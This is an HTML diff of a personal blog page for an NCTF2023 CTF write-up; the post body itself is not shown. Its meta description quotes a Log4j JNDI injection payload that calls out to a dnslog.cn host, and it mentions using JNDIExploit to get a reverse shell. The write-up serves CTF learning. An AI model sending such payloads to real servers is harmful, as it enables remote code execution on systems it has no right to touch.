@@ -4,15 +4,47 @@
   <meta charset="utf-8">
   
   
-  <title>St4rr&#39;s Blog</title>
+  <title>NCTF2023 Writeup | St4rr&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="St4rr&#39;s Blog">
-<meta property="og:url" content="http://www.blog.st4rr.top/index.html">
+  <meta name="description" content="NCTF2023 bedpanic WriteupWeblogging根据hint   构造有问题的请求头，在错误日志输出的时候会解析其中的$&#123;jndi:ldap:&#x2F;&#x2F;pqeyo2.dnslog.cn&#x2F;&#125;，我们收到访问就能证明成功了 使用工具JNDIExploit来JNDI注入 值得一提的是这东西要拿java8来跑 然后直接反弹shell拿下     ez_wordpress">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2023 Writeup">
+<meta property="og:url" content="http://www.blog.st4rr.top/2024/01/24/NCTF2023%20Writeup/index.html">
 <meta property="og:site_name" content="St4rr&#39;s Blog">
+<meta property="og:description" content="NCTF2023 bedpanic WriteupWeblogging根据hint   构造有问题的请求头，在错误日志输出的时候会解析其中的$&#123;jndi:ldap:&#x2F;&#x2F;pqeyo2.dnslog.cn&#x2F;&#125;，我们收到访问就能证明成功了 使用工具JNDIExploit来JNDI注入 值得一提的是这东西要拿java8来跑 然后直接反弹shell拿下     ez_wordpress">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224214936126.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224214948043.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224215517853.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224220112541.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224220153427.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224220235169.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224220527639.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224220745241.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224220756899.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224221135124.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224221145605.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224222320037.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224222452667.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224222555485.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224222718663.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224222842120.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224222901722.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225124512499.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225125045842.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225125914457.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225125938955.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225125957728.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225130124912.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225130150921.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225130417377.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225130535609.png">
+<meta property="og:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231225130945149.png">
+<meta property="article:published_time" content="2024-01-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-24T13:10:51.244Z">
 <meta property="article:author" content="St4rr">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\jyzho\AppData\Roaming\Typora\typora-user-images\image-20231224214936126.png">
   
     <link rel="alternate" href="/atom.xml" title="St4rr's Blog" type="application/atom+xml">
   
@@ -67,47 +99,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-0xGame2023-Writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/24/0xGame2023-Writeup/" class="article-date">
-  <time class="dt-published" datetime="2024-01-23T16:00:00.000Z" itemprop="datePublished">2024-01-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/24/0xGame2023-Writeup/">0xGame2023 Writeup</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="点我查看Week1-Writeup-www-st4rr-top-0xGame2023-Week1-Writeup-pdf"><a href="#点我查看Week1-Writeup-www-st4rr-top-0xGame2023-Week1-Writeup-pdf" class="headerlink" title="[点我查看Week1 Writeup](www.st4rr.top/0xGame2023/Week1 Writeup.pdf)"></a>[点我查看Week1 Writeup](<a target="_blank" rel="noopener" href="http://www.st4rr.top/0xGame2023/Week1">www.st4rr.top/0xGame2023/Week1</a> Writeup.pdf)</h4><h4 id="点我查看Week2-Writeup-www-st4rr-top-0xGame2023-Week2-Writeup-pdf"><a href="#点我查看Week2-Writeup-www-st4rr-top-0xGame2023-Week2-Writeup-pdf" class="headerlink" title="[点我查看Week2 Writeup](www.st4rr.top/0xGame2023/Week2 Writeup.pdf)"></a>[点我查看Week2 Writeup](<a target="_blank" rel="noopener" href="http://www.st4rr.top/0xGame2023/Week2">www.st4rr.top/0xGame2023/Week2</a> Writeup.pdf)</h4><h4 id="点我查看Week3-Writeup-www-st4rr-top-0xGame2023-Week3-Writeup-pdf"><a href="#点我查看Week3-Writeup-www-st4rr-top-0xGame2023-Week3-Writeup-pdf" class="headerlink" title="[点我查看Week3 Writeup](www.st4rr.top/0xGame2023/Week3 Writeup.pdf)"></a>[点我查看Week3 Writeup](<a target="_blank" rel="noopener" href="http://www.st4rr.top/0xGame2023/Week3">www.st4rr.top/0xGame2023/Week3</a> Writeup.pdf)</h4><h4 id="点我查看Week4-Writeup-www-st4rr-top-0xGame2023-Week4-Writeup-pdf"><a href="#点我查看Week4-Writeup-www-st4rr-top-0xGame2023-Week4-Writeup-pdf" class="headerlink" title="[点我查看Week4 Writeup](www.st4rr.top/0xGame2023/Week4 Writeup.pdf)"></a>[点我查看Week4 Writeup](<a target="_blank" rel="noopener" href="http://www.st4rr.top/0xGame2023/Week4">www.st4rr.top/0xGame2023/Week4</a> Writeup.pdf)</h4>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.blog.st4rr.top/2024/01/24/0xGame2023-Writeup/" data-id="clrrt0foe0000w0vp3l6dgt0t" data-title="0xGame2023 Writeup" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-NCTF2023 Writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-NCTF2023 Writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/01/24/NCTF2023%20Writeup/" class="article-date">
   <time class="dt-published" datetime="2024-01-23T16:00:00.000Z" itemprop="datePublished">2024-01-24</time>
@@ -120,8 +112,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/24/NCTF2023%20Writeup/">NCTF2023 Writeup</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      NCTF2023 Writeup
     </h1>
   
 
@@ -220,54 +212,28 @@
     </footer>
   </div>
   
-</article>
-
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-Hello,world!" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/20/Hello,world!/" class="article-date">
-  <time class="dt-published" datetime="2024-01-19T16:00:00.000Z" itemprop="datePublished">2024-01-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <a href="/2024/01/24/0xGame2023-Writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
         
+          0xGame2023 Writeup
+        
+      </div>
+    </a>
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/20/Hello,world!/">Hello,world!</a>
-    </h1>
   
+    <a href="/2024/01/20/Hello,world!/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello,world!</div>
+    </a>
+  
+</nav>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>First Bloog! (lol)</p>
-<p>Welcome to my site, everybodyyyyy!</p>
-<p>I’m St4rr, just a noob in computer science now (T0T). Recently I’ve been really into the field of cyber security and trying to become a CTFer…….</p>
-<p>I’m planning to update some academic articles on this website <del>(using it as a diary (xD))</del>. It’s welcome 4 everyone 2 read. And suggestions r appreciated. </p>
-<p>Wish all the best! </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.blog.st4rr.top/2024/01/20/Hello,world!/" data-id="clrm591sn0000rwvp127phvdd" data-title="Hello,world!" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-
-  
 
 
 </section>
